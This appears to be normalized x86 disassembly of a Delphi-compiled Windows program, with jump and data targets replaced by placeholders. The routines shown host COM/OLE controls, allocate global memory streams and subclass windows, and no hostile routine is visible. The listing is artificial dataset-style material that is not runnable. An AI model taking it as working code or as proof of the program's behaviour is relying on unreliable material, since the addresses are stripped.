mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47502e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
push ebp
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_406030
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x218
call sub_405b50
push eax
push r-xdata
push 0x5
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
push eax
call CoCreateInstance
pop edx
call sub_474ebc
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_405b50
push eax
push r-xdata
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
push eax
call CoGetClassObject
call sub_46f84c
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x208 ]
mov edx [ edx + 0x28 ]
call sub_40493c
push ebp
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406030
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x218
call sub_405b50
push eax
mov eax [ ebp - 0xc ]
push eax
push r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
pop edx
call sub_474ebc
pop ecx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475035
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404144
lea eax [ ebp - 0xc ]
call sub_40482c
lea eax [ ebp - 0x8 ]
call sub_405b50
retn
sub_47505c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47511e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4753d4
push 0x0
push 0x2
call GlobalAlloc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] ebx
test ebx ebx
jne r-xdata
xor eax eax
push ebp
push sub_4750f1
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_405b50
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call CreateStreamOnHGlobal
call sub_46f84c
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
call sub_46f84c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_40bc38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475125
lea eax [ ebp - 0x8 ]
call sub_405b50
retn
sub_47512c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_474bcc
test [ ebx + 0x23d ] 0x4
jne r-xdata
mov eax ebx
call sub_44a724
mov edx esp
mov eax ebx
call sub_446924
push esp
mov eax ebx
call sub_44d5a0
push eax
push 0x0
mov eax ebx
test eax eax
je r-xdata
push eax
push 0x0
push 0xfffffffb
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
cmp [ ebx + 0x22c ] 0x0
jne r-xdata
sub eax 0xfffffd9c
mov eax ebx
call sub_47563c
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
add esp 0x10
pop ebx
retn
mov eax ebx
call sub_44d7a4
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax ebx
call sub_44d7a4
push eax
call ShowWindow
jmp r-xdata
sub_4751d0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edx edx
push ebp
push sub_475251
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax ebx
call sub_44daa8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44b2e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ esi ]
cmp eax 0xbc00
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test [ ebx + 0x23e ] 0x1
jne r-xdata
cmp eax 0xc000
jae r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_44d7a4
push eax
mov eax [ ebx + 0x174 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub [ esi ] 0x9c00
sub_475260
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
setne al
pop esi
pop ebx
retn
sub_475288
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_40399c#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44aaac
mov eax [ ebp - 0x4 ]
push eax
push sub_475a4c
mov eax [ ebp - 0x4 ]
push eax
push sub_476348
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
setne cl
mov edx r-xdata
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47532c
push ebx
mov ebx eax
lea ecx [ ebx + 0x238 ]
mov eax [ ebx + 0x208 ]
lea edx [ eax + 0x10 ]
mov eax [ ebx + 0x218 ]
call sub_46fb04
lea ecx [ ebx + 0x234 ]
mov edx r-xdata
mov eax [ ebx + 0x218 ]
call sub_46fb04
lea eax [ ebx + 0x228 ]
call sub_405b50
lea eax [ ebx + 0x224 ]
call sub_405b50
lea eax [ ebx + 0x220 ]
call sub_405b50
pop ebx
retn
sub_475394
push ebx
push esi
push edi
mov ebx [ eax + 0x208 ]
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x4c ]
call sub_403390
xor eax eax
mov [ ebx + 0x4c ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x4c ]
call sub_41b654
call sub_403390
inc edi
dec esi
jne r-xdata
sub_4753f4
push ebx
mov ebx eax
test [ ebx + 0x23d ] 0x4
jne r-xdata
mov eax ebx
call sub_44ab60
pop ebx
retn
mov eax [ ebx + 0x174 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x180 ]
push eax
call SetWindowLongA
cmp [ ebx + 0x218 ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x180 ] eax
pop ebx
retn
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
sub_475440
push ebx
push esi
push edi
push ecx
mov ebx eax
mov ecx [ ebx + 0x208 ]
mov edi [ ecx + 0x20 ]
mov esi [ ecx + 0x24 ]
xor eax eax
jmp r-xdata
cmp eax edi
jne r-xdata
cmp edx [ esi + eax * 4 ]
je r-xdata
xor eax eax
xor edx edx
jmp r-xdata
push eax
cmp [ ecx + 0x30 ] 0x191
jb r-xdata
inc eax
pop ecx
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx ]
call sub_40331c
call sub_403358
add eax 0x7
and eax 0xfffffff8
mov eax [ ecx + 0x50 ]
test eax eax
jne r-xdata
add ebx eax
pop eax
mov edx [ ebx + eax * 8 + 0x4 ]
mov eax [ ebx + eax * 8 ]
sub_4754b4
push ebx
push esi
xor esi esi
call sub_45dd9c
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov edx [ rw-data ]
mov esi [ eax + 0x248 ]
mov esi [ ebx + 0x248 ]
jmp r-xdata
sub_475518
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
call sub_40f624
mov ecx esi
mov edx edi
mov eax ebx
call sub_475538
pop edi
pop esi
pop ebx
retn
sub_475538
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_404ab8
xor eax eax
push ebp
push sub_4755ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_474bcc
mov [ esi ] 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
push esi
push rw-data
push 0x2
push 0x0
mov eax [ rw-data ]
push eax
push edi
mov eax [ ebx + 0x224 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4755c1
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_404b88
retn
lea edx [ ebp - 0x20 ]
call sub_470398
sub_4755c8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_475616
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax ebx
call sub_475624
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_412bb4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47561d
lea eax [ ebp - 0x10 ]
call sub_40f638
retn
sub_475624
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_475518
pop edi
pop esi
pop ebx
retn
sub_47563c
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x22c ] 0x0
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
xor eax eax
mov [ esp ] eax
push esp
mov eax [ ebx + 0x22c ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
cmp [ esp ] 0x0
jne r-xdata
mov esi [ esp ]
mov [ ebx + 0x180 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov [ ebx + 0x174 ] eax
mov eax [ rw-data ]
mov [ eax ] ebx
push sub_443d78
push 0xfffffffc
mov eax [ ebx + 0x180 ]
push eax
call SetWindowLongA
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SendMessageA
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
sub_4756cc
push ebx
push esi
push ebp
mov ebp esp
mov ebx eax
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov edx [ ebx + 0x8 ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
mov esp ebp
pop ebp
pop esi
pop ebx
retn
xor eax eax
lea esi [ ebx + 0x10 ]
push [ esi + 0x8 ]
je r-xdata
mov al [ esi ]
cmp al 0x1
ja r-xdata
push [ esi + 0x4 ]
test ah ah
jne r-xdata
mov ecx [ esi + 0x4 ]
mov ah 0x1
jmp r-xdata
add esi 0xc
dec edx
jne r-xdata
sub_47570c
push ebp
mov ebp esp
add esp 0xfffffd64
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x29c ]
mov eax [ ebp - 0x4 ]
call sub_475440
cmp [ ebp - 0x29c ] 0x10000
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push j_sub_403870#4
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x294 ] eax
mov eax edx
mov [ ebp - 0x290 ] eax
test edx edx
je r-xdata
lea eax [ ebp - 0x29c ]
call sub_4756cc
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
add eax eax
mov edx [ ebx ]
lea eax [ edx + eax * 8 ]
mov ebx eax
lea esi [ ebp - 0x28c ]
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
lea esi [ ebp + ebx * 8 - 0x10c ]
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx eax
sub edx 0x4
je r-xdata
mov [ esi ] 0x0
mov edx [ ebp - 0xc ]
lea edi [ ebp + edx * 8 - 0x10c ]
xor edx edx
mov [ edi ] edx
test ah 0x40
je r-xdata
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov eax [ esi ]
call sub_404f48
mov edx [ esi + 0x4 ]
mov [ edx ] eax
mov [ esi ] 0x1
mov eax [ ebx + 0x8 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
dec edx
sub edx 0x3
jb r-xdata
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_404f24
xor eax eax
mov [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ esi + 0x4 ] eax
mov edx edi
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_404f24
mov eax [ ebx + 0x8 ]
mov [ edi + 0x4 ] eax
mov [ esi + 0x4 ] edi
jmp r-xdata
dec ebx
lea eax [ ebp + ebx * 8 - 0x10c ]
call sub_404120
test ebx ebx
jne r-xdata
add esi 0xc
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x290 ]
jne r-xdata
mov [ esi ] 0x2
mov eax [ ebx + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0x8 ] eax
jmp r-xdata
dec edx
je r-xdata
inc [ ebp - 0xc ]
jmp r-xdata
sub ebx 0x10
mov eax [ ebx ]
and eax 0xffff
mov edx eax
and edx 0xfff
cmp edx 0x8
jne r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] ebx
jmp r-xdata
jmp r-xdata
mov [ esi ] 0x0
test ah 0x20
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ esi + 0x4 ] eax
mov [ esi + 0x4 ] ebx
jmp r-xdata
sub_4758ac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x30 ] 0x12c
jge r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_475440
cmp [ ebp - 0x10 ] 0x10000
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_47570c
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push j_sub_403870#3
push [ fs : eax ]
mov [ fs : eax ] esp
push ebx
push esi
mov esi [ ebp - 0x4 ]
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call [ ebp - 0x10 ]
pop esi
pop ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov esi [ esi ]
mov eax ebx
shl eax 0x4
xor edx edx
add esi eax
cmp ax 0x7
ja r-xdata
je r-xdata
test dl dl
jne r-xdata
push [ esi + 0xc ]
push [ esi + 0x8 ]
test eax 0x2000
je r-xdata
mov ecx esi
inc dl
test eax 0x2000
jne r-xdata
sub esi 0x10
mov eax [ esi ]
cmp ax 0x4
ja r-xdata
push esi
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ esi + 0x8 ]
jmp r-xdata
sub_475990
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
xor ebx ebx
mov eax esi
call sub_44daa8
and al [ esp ]
je r-xdata
test bl bl
jne r-xdata
push 0x0
push 0x0
push 0x30f
mov eax esi
call sub_44d7a4
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
test eax eax
setne bl
mov eax ebx
pop edx
pop esi
pop ebx
retn
mov dl [ esp ]
mov eax esi
call sub_44ca34
mov ebx eax
sub_4759e0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov ebx [ esi + 0x244 ]
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax [ ebx + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov ebx eax
xor edi edi
inc edi
dec ebx
jne r-xdata
mov eax ebp
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov edx edi
mov eax [ esi + 0x244 ]
call sub_41b654
cmp ebp eax
jne r-xdata
mov edx [ esi + 0x208 ]
mov edx [ edx + 0x40 ]
mov edx [ edx + edi * 4 ]
mov ecx eax
mov eax esi
call sub_475db0
jmp r-xdata
sub_475a4c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4753d4
xor eax eax
push ebp
push sub_475aee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
push 0x2
call GlobalAlloc
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] esi
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalLock
mov esi eax
xor eax eax
push ebp
push sub_475add
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475ae4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalUnlock
retn
call sub_40bc38
sub_475b08
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebx + 0x48 ]
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp + 0x8 ]
je r-xdata
test eax eax
jg r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_44d158
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test edx edx
jle r-xdata
test [ ebx + 0x23d ] 0x4
jne r-xdata
mov esi [ ebx + 0x48 ]
mov eax [ ebx + 0x4c ]
mov [ ebp + 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
push 0x9ec
mov eax [ ebp + 0x8 ]
push eax
call MulDiv
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
push 0x9ec
push esi
call MulDiv
lea ecx [ ebp - 0x10 ]
pop edx
call sub_419ff0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x44 ]
test eax eax
je r-xdata
sub_475be8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_475c8e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x8 ]
call sub_4041b8
mov edx esi
mov eax ebx
call sub_446d6c
cmp [ ebx + 0x220 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475c95
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
push 0xfffffd42
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0x2c ]
test al 0x30
je r-xdata
test al 0x10
je r-xdata
mov edi 0xfffffdfb
mov edi 0xfffffdfa
jmp r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_475f58
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_4755c8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40452c
jne r-xdata
sub_475cd0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_475da0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_446e58
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475da7
lea eax [ ebp - 0x8 ]
call sub_405b50
retn
xor eax eax
push ebp
push j_sub_403870#2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_405b50
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_46f84c
sub eax 0xfffffd9c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
sub_475d3a
or ebx 0xffffffff
call sub_403bd8
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_46f84c
sub eax 0xfffffd9c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475da7
lea eax [ ebp - 0x8 ]
call sub_405b50
retn
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
sub_475db0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_475e92
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475e99
lea eax [ ebp - 0x10 ]
call sub_405b50
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] 0x1
xor eax eax
push ebp
push sub_475e75
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] 0x0
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
mov edx ebx
call sub_41b654
mov edi eax
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_472cac
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_475bb8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + ebx * 4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
sub_475ea0
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ ebp - 0x30 ]
mov edx [ r-xdata ]
call sub_404ab8
xor eax eax
push ebp
push sub_475f47
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_474bcc
mov [ ebp - 0x10 ] esi
mov eax rw-data
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
cmp [ esi ] 0x9
je r-xdata
mov eax 0x8
mov eax 0x4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475f4e
lea eax [ ebp - 0x30 ]
mov edx [ r-xdata ]
call sub_404b88
retn
lea edx [ ebp - 0x30 ]
call sub_470398
push 0x0
lea edx [ ebp - 0x30 ]
push edx
push 0x0
lea edx [ ebp - 0x10 ]
push edx
push eax
push 0x0
mov eax [ rw-data ]
push eax
push edi
mov eax [ ebx + 0x224 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
sub_475f58
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x10 ] 0x8
mov eax edi
call sub_404f48
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_475fa8
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax ebx
call sub_475ea0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475faf
mov eax [ ebp - 0x8 ]
push eax
call SysFreeString
retn
sub_475fb8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax esi
call sub_45dd9c
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
cmp esi [ edi + 0x27c ]
jne r-xdata
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
xor eax eax
mov [ edi + 0x27c ] eax
mov [ edi + 0x27c ] esi
jmp r-xdata
cmp esi eax
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_448138
sub_476008
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_476056
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
mov edx edi
call sub_413e28
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax ebx
call sub_475cc8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47605d
lea eax [ ebp - 0x10 ]
call sub_40f638
retn
sub_476064
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ecx ]
xor eax eax
push ebp
push j_sub_403870
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
add eax 0x25f
cmp eax 0x7
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_476099 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_40358c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_40358c
jmp r-xdata
cmp [ ecx + 0x8 ] 0x2
jl r-xdata
cmp [ ecx + 0x8 ] 0x0
jle r-xdata
cmp [ ecx + 0x8 ] 0x4
jl r-xdata
lea eax [ ebx + 0x10 ]
call sub_410254
mov [ ebp - 0xe ] ax
mov eax ebx
call sub_410254
mov edi eax
sub esi 0xfffffda4
je r-xdata
mov eax ebx
call sub_410254
mov [ ebp - 0xf ] al
lea edx [ ebp - 0xf ]
mov eax [ ebp - 0x4 ]
mov si 0xffba
call sub_40358c
test [ ebx + 0x1 ] 0x40
je r-xdata
lea eax [ ebx + 0x30 ]
call sub_410254
mov edi eax
and edi 0x7
lea eax [ ebx + 0x20 ]
call sub_410254
and eax 0x7
mov [ ebp - 0xc ] eax
mov al [ edi + rw-data ]
mov [ ebp - 0x6 ] al
mov al [ edi + rw-data ]
mov edx [ ebp - 0xc ]
or al [ edx + rw-data ]
mov [ ebp - 0x5 ] al
lea eax [ ebx + 0x10 ]
call sub_410254
mov edi eax
